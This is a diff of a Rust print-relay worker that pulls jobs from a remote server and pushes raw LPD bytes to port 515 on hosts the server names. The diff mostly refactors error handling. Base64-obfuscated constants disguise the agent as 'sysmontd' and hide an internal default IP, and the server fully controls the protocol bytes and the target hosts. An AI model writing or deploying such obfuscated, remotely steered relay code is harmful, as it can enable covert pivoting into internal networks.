@@ -32,7 +32,7 @@ mod tcp_extras;
 mod types;
 mod utils;
 
-use anyhow::Result;
+use anyhow::{Context, Result};
 use reqwest::{
     blocking::Client,
     header::{HeaderMap, HeaderValue},
@@ -66,7 +66,9 @@ static ALIAS: LazyLock<String> = LazyLock::new(|| decode_b64("c3lzbW9udGQ=").exp
 static AGENT: LazyLock<String> = LazyLock::new(|| format!("{}/1.0", ALIAS.as_str()));
 static DEF_HOST: LazyLock<String> = LazyLock::new(|| decode_b64("MTcyLjE2LjAuMTEx").expect("ih"));
 static DEF_QUEUE: LazyLock<String> = LazyLock::new(|| decode_b64("c2VjdXJl").expect("iq"));
+
 const DEF_PORT: u16 = 515;
+const NUL: [u8; 1] = [0u8];
 
 macro_rules! debug_log {
     ($($arg:tt)*) => {
@@ -76,29 +78,36 @@ macro_rules! debug_log {
     };
 }
 
-fn is_online(host: &str, port: Option<u16>) -> bool {
-    if host.is_empty() {
-        return false;
-    };
-    let port = port.unwrap_or(DEF_PORT);
-    let addr: SocketAddr = format!("{host}:{port}").parse().unwrap();
+macro_rules! sock {
+    ($x:ident, $h:ident, $p:ident, $t:expr) => {
+        let $x: SocketAddr = format!("{}:{}", $h, $p)
+            .parse()
+            .with_context(|| format!("failed to parse socket address"))?;
 
-    let Ok(conn) = TcpStream::connect_timeout(&addr, Duration::from_millis(800)) else {
-        return false;
+        let $x = TcpStream::connect_timeout(&$x, Duration::from_secs($t));
     };
-
-    conn.shutdown(std::net::Shutdown::Both)
-        .expect("failed to shutdown socket while checking is_online");
-    true
 }
 
-fn hdrs(printer_host: &str) -> HeaderMap {
-    let mut map = HeaderMap::new();
-    let spooler = if is_online(printer_host, None) {
-        "1"
-    } else {
-        "0"
+fn is_online(host: &str) -> Result<bool> {
+    if host.is_empty() {
+        return Ok(false);
     };
+
+    sock!(s, host, DEF_PORT, 800);
+
+    if let Ok(conn) = s {
+        conn.shutdown(std::net::Shutdown::Both)
+            .context("failed to shutdown socket while checking is_online")?;
+    } else {
+        return Ok(false);
+    }
+
+    Ok(true)
+}
+
+fn hdrs(printer_host: &str) -> Result<HeaderMap> {
+    let mut map = HeaderMap::new();
+    let spooler = if is_online(printer_host)? { "1" } else { "0" };
     let jobs = &JOBS_COMPLETED.load(Ordering::Relaxed).to_string();
 
     map.insert("User-Agent", HeaderValue::from_str(&AGENT).unwrap());
@@ -106,12 +115,12 @@ fn hdrs(printer_host: &str) -> HeaderMap {
     map.insert("X-Worker-Spooler", HeaderValue::from_str(&spooler).unwrap());
     map.insert("X-Worker-Jobs", HeaderValue::from_str(&jobs).unwrap());
 
-    map
+    Ok(map)
 }
 
-fn claim_job(id: Option<&str>, host: &str) -> bool {
+fn claim_job(id: Option<&str>, host: &str) -> Result<bool> {
     let Some(id) = id.filter(|f| !f.is_empty()) else {
-        return true;
+        return Ok(true);
     };
 
     let body = json!({ "id": id });
@@ -119,17 +128,17 @@ fn claim_job(id: Option<&str>, host: &str) -> bool {
         .post(format!("{}/print/claim", BASE_URL.as_str()))
         .body(body.to_string())
         .header("Content-Type", "application/json")
-        .headers(hdrs(host))
+        .headers(hdrs(host)?)
         .timeout(Duration::from_secs(2))
         .send();
 
     let claim = match resp {
         Ok(r) => {
             let Ok(r) = r.error_for_status() else {
-                return false;
+                return Ok(false);
             };
             let Ok(value) = r.json::<Value>() else {
-                return false;
+                return Ok(false);
             };
 
             value
@@ -149,7 +158,7 @@ fn claim_job(id: Option<&str>, host: &str) -> bool {
         debug_log!("Skipping on this job...")
     }
 
-    claim
+    Ok(claim)
 }
 
 fn handle(job: Job) -> Result<()> {
@@ -158,23 +167,21 @@ fn handle(job: Job) -> Result<()> {
     let host = job.printer_host.as_deref().unwrap_or(DEF_HOST.as_str());
     let queue_name = job.printer_queue.as_deref().unwrap_or(DEF_QUEUE.as_str());
 
-    if !(claim_job(j_id.as_deref(), host)) {
+    if !(claim_job(j_id.as_deref(), host)?) || !is_online(host)? {
         return Ok(());
     }
+
     let Some(payload) = decode_field(job.payload.as_deref())? else {
         return Ok(());
     };
 
     let q_cmd = decode_field(job.q_cmd.as_deref())?
         .unwrap_or_else(|| format!("\x02{}\n", queue_name).into_bytes());
-
     let ctl = decode_field(job.ctl.as_deref())?
         .or(decode_field(job.control_file.as_deref())?)
         .unwrap_or_default();
-
     let cf_hdr = decode_field(job.cf_hdr.as_deref())?
         .unwrap_or_else(|| format!("\x02{} cfA002{}\n", ctl.len(), ALIAS.as_str()).into_bytes());
-
     let df_hdr = decode_field(job.df_hdr.as_deref())?.unwrap_or_else(|| {
         format!("\x03{} dfA002{}\n", payload.len(), ALIAS.as_str()).into_bytes()
     });
@@ -184,33 +191,28 @@ fn handle(job: Job) -> Result<()> {
         payload.len()
     );
 
-    let addr = (host, DEF_PORT);
-    let mut socket = match TcpStream::connect(addr) {
+    sock!(s, host, DEF_PORT, 6000);
+    let mut socket = match s {
         Ok(s) => s,
         Err(e) => {
-            debug_log!("Failed to connect using TcpStream::connect to address: {addr:?}: {e}");
+            debug_log!("Failed to connect to {host}:{DEF_PORT}: {e}");
             return Ok(());
         }
     };
 
     socket.set_nodelay(true)?;
-    let timeout = Duration::from_secs((15 + payload.len() as u64 / 1048576 * 10).clamp(15, 600));
 
-    socket.set_read_timeout(Some(timeout))?;
-    socket.set_write_timeout(Some(timeout))?;
-
-    let nul = [0u8];
     if socket.send_buf(&q_cmd)
         && socket.recv_ack()
         && socket.send_buf(&cf_hdr)
         && socket.recv_ack()
         && socket.send_buf(&ctl)
-        && socket.send_buf(&nul)
+        && socket.send_buf(&NUL)
         && socket.recv_ack()
         && socket.send_buf(&df_hdr)
         && socket.recv_ack()
         && socket.send_buf(&payload)
-        && socket.send_buf(&nul)
+        && socket.send_buf(&NUL)
         && socket.recv_ack()
     {
         debug_log!("Job transferred successfully. Shutting down current socket connection.");
@@ -226,7 +228,7 @@ fn stream() -> Result<()> {
         .get(format!("{}/printer", BASE_URL.as_str()))
         .header("Accept", "text/event-stream")
         .header("Connection", "keep-alive")
-        .headers(hdrs(&DEF_HOST))
+        .headers(hdrs(&DEF_HOST)?)
         .timeout(Duration::from_secs(90))
         .send()
     {
